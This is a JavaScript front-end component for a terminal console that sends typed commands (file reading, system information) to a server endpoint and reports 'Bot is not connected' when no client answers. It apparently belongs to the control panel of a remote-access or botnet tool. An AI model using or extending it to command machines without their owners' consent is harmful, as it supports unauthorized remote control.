'use strict';

const SshEnum = { help: 'menu' };

class SSH extends Terminal {
    constructor() {
        Terminal.isSSH = true;
        super();
    }

    get mainMenu() {
        return (
            '<p>' +
            '<span>Type [command] + <kbd>Enter</kbd></span>' +
            '</p>' +
            '<ul style="list-style: none;">' +
            "<li>'menu' -- display this list</li>" +
            "<li>'cls' -- clear screeen</li>" +
            "<li>'help' -- display help</li>" +
            "<li>'type [filename]' -- read a file</li>" +
            "<li>'systeminfo' -- display system information</li>" +
            '</ul>'
        );
    }

    execute(cmd) {
        if (cmd.toLowerCase() === SshEnum.help) {
            this.stopExe(cmd, '');
            $('#console-output').append(terminalObj.mainMenu);
            this.scroll();
            return;
        }

        this.startExe();

        $.ajax({
            type: 'POST',
            url: '/control/ssh',
            data: { cmd: cmd },
            beforeSend: request => {
                request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
            }
        })
            .done(resp => {
                let msg;

                if (resp['resp'].length !== 0) {
                    msg = resp['resp'];
                } else {
                    msg = 'Bot is not connected';
                }

                if (Terminal.isSSH) {
                    this.stopExe(cmd, msg);
                } else {
                    this.stopExe('', '');
                }

                if (resp['resp'].length === 0) {
                    disableConsole();
                    updateStatus();
                }
            })
            .fail(() => {
                this.stopExe(cmd, 'Failed to contact server');
            });
    }
}
